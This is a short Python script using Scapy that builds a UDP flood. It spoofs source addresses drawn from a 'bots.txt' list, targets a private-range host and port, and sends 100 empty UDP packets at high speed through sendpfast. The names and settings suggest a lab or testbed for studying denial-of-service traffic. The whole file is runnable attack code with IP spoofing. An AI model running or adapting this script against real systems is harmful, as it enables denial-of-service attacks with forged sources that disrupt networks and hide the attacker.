from scapy.all import *
import scapy
import random
import time
import sys
import ipaddress

# UDP Flood (0 bytes)
TARGET_IP = "192.168.100.2"
TARGET_PORT = 50001
BOTFILE = "../bots.txt"
NUM_PACKETS = 100

def load_bots(filename):
    bot_ips = []

    with open(filename, "r") as f:
        for line in f:
            ip = line.strip()
            if ip:
                ipaddress.ip_address(ip)
                bot_ips.append(ip)

    return bot_ips

def run_udp_flood_attack():
    """UDP Flood Attack"""
    bot_ips = load_bots(BOTFILE)

    numero_de_pacotes_enviados = 0

    lista_de_pacotes = []

    while True:
        source_ip = random.choice(bot_ips)

        ip_layer = IP(src=source_ip, dst=TARGET_IP)
        eth_layer = Ether()
        udp_layer = UDP(sport=RandShort(), dport=TARGET_PORT)


        packet = eth_layer / ip_layer / udp_layer 

        lista_de_pacotes.append(packet)
        numero_de_pacotes_enviados += 1

        if(numero_de_pacotes_enviados == NUM_PACKETS):
            break


    start_time = time.perf_counter()
    sendpfast(lista_de_pacotes, iface="enp0s3", file_cache=True)
    end_time = time.perf_counter()
    duration = end_time - start_time

    print(f"\nSending completed.")
    print(f"Total time to send packets: {duration:.4f} seconds")


if __name__ == "__main__":
    run_udp_flood_attack()

# sudo PYTHONPATH=$HOME/scapy python3 udp_flood_0bytes.py